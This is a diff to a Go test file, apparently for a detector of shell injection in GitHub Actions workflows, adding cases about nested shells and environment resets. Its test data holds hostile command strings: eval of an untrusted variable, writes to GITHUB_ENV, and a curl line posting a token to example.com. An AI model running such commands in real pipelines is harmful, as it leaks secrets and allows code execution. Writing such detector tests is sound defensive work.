@@ -40,7 +40,9 @@ func TestNestedShell(t *testing.T) {
 		{"code-injection", prt, title, `bash -c 'eval "$T"'`, `eval "$T"`},
 		{"envvar-injection", prt, title, `bash -c 'echo "X=$T" >> "$GITHUB_ENV"'`, `echo "X=$T" >> "$GITHUB_ENV"`},
 		{"secret-exfiltration", "push", token, `sh -c 'curl -d "$TOK" https://example.com'`, `curl -d "$TOK" https://example.com`},
-		{"sudo, -e before -c", prt, title, `sudo bash -ec 'eval "$T"'`, `eval "$T"`},
+		{"-e before -c", prt, title, `bash -ec 'eval "$T"'`, `eval "$T"`},
+		{"env -u of another name", prt, title, `env -u OTHER bash -c 'eval "$T"'`, `eval "$T"`},
+		{"export -n in a subshell", prt, title, `( export -n T ); bash -c 'eval "$T"'`, `eval "$T"`},
 	} {
 		want := nestedShellKinds(t, tc.event, tc.env, tc.control)
 		if len(want) == 0 {
@@ -55,6 +57,9 @@ func TestNestedShell(t *testing.T) {
 		{"assigned before, written to GITHUB_ENV", `T=x; bash -c 'echo "X=$T" >> "$GITHUB_ENV"'`},
 		{"assigned for the command", `T=x bash -c 'eval "$T"'`},
 		{"env -i", `env -i bash -c 'eval "$T"'`},
+		{"env -u", `env -u T bash -c 'eval "$T"'`},
+		{"sudo resets the environment", `sudo bash -c 'eval "$T"'`},
+		{"sudo -E", `sudo -E bash -ec 'eval "$T"'`},
 		{"env assigns", `env T=x bash -c 'eval "$T"'`},
 		{"export -n", `export -n T; bash -c 'eval "$T"'`},
 		{"declare +x", `declare +x T; bash -c 'eval "$T"'`},
